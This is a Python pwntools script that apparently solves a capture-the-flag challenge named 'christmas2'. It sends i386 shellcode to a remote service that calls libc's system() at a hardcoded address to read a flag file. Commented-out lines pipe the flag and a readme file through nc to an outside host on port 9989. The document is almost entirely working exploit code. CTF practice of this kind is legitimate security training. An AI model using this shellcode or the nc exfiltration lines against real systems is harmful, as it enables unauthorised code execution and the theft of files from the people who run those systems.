#!/usr/bin/python
from pwn import *
from time import sleep

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'error'

r = remote ("0", 19002)
#r = process ("/home/christmas2/asm2")

r.recvuntil ("shellcode: ")


system_offset = 0x3a920
libc_base = 0xf75c7000
system_addr = libc_base + system_offset
sc = ''
sc += asm (shellcraft.i386.pushstr ('/bin/cat flag'))
sc += asm ('push esp')
sc += asm ('push eax')
#sc += asm ('push ' + str(system_addr))
hs = hex(system_addr)
#print hs
sc += asm ('push ' + hs)
sc += asm ('ret') *3

#print len (sc)
#print sc

r.sendline (sc)

r.recvuntil ("buena suerte!")
print "FUCK"
#r.sendline ("/bin/cat /home/christmas2_pwn/flag | nc plus.or.kr 9989")
print r.recvline ()
print r.recvline ()
#r.sendline ("/bin/cat /home/christmas2/readme | nc plus.or.kr 9989")

